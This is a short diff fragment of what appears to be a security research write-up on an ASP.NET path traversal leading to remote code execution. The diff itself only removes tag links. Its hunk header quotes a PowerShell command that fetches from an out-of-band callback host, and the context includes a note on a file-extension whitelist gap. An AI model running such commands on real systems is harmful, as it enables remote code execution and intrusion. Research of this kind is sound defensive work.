@@ -732,5 +732,3 @@ Cmd: powershell -nop -c "iwr -useb http://oyq3xdzb4av5oszlrakgpdyvxm3dr6iu7.oast
 5. File extension whitelist only applies to HTTP requests, not to internal File.Exists() calls from .NET code
 
 ```
-
- [ASP.NET](https://lab.ctbb.show/research/?tag=ASP.NET) [PathTraversal](https://lab.ctbb.show/research/?tag=PathTraversal) [RCE](https://lab.ctbb.show/research/?tag=RCE)
